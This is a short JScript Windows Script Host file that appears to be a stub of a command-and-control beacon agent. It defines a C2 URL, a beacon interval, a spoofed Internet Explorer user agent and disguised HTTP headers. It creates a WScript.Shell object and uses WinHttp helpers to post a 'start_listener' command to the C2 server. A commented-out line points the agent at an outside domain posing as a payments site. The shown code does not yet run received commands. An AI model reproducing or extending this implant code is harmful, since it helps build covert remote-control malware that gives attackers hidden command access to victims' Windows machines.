//#######################
//   GLOBAL VARIABLES
//#######################
var curcmd = "";
var serverMsg = "";
var c2url = "http://localhost:29000";
var objShell = new ActiveXObject("WScript.Shell");
var beaconTime = 3000;
var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
var uri = "/api/update";
var xFrameOptions = "SAMEORIGIN";
var contentEncoding = "gzip";
var contentType = "text/xml";
//var c2url = "http://ssppayments.com/c2.html";

var initcmd = "";

function webRequest(target) {
  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
    WinHttpReq.Open("GET", target, false);
    //  Send the HTTP request.
    WinHttpReq.Send();
    // Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //  Retrieve the response text.
    res = WinHttpReq.ResponseText;
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " +
        (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }
  return res;
}
function webPost(target, cmdResponse) {
  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
    WinHttpReq.Open("POST", target, false);

    // Set HTTP Headers
    WinHttpReq.setRequestHeader("User-Agent", useragent);
    WinHttpReq.setRequestHeader("X-Frame-Options", xFrameOptions);
    WinHttpReq.setRequestHeader("Content-Type", contentType);

    //  Send the HTTP request.
    WinHttpReq.Send(cmdResponse);
    // Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //  Retrieve the response text.
    res = WinHttpReq.ResponseText;
    WScript.Echo(res);
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " +
        (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }
  return res;
}

var target = c2url + uri;
var cmdResponse = '{"component": "oculus", "action": { "start_listener": { "name": "httplistener", "type": "http", "lport": "80", "lhost": "127.0.0.1"}}}';
webPost(target, cmdResponse);


/*
res = webRequest(target2);
WScript.Echo(res);


var target = c2url + uri;
var target2 = "http://10.0.0.134/"
// var cmdResponse = '{"id": "Gryffindor", "reqcmd": "command", "retval": "CMD RESPONSE"}'

//webPost(target, cmdResponse);
res = webRequest(target2);
WScript.Echo(res);







*/
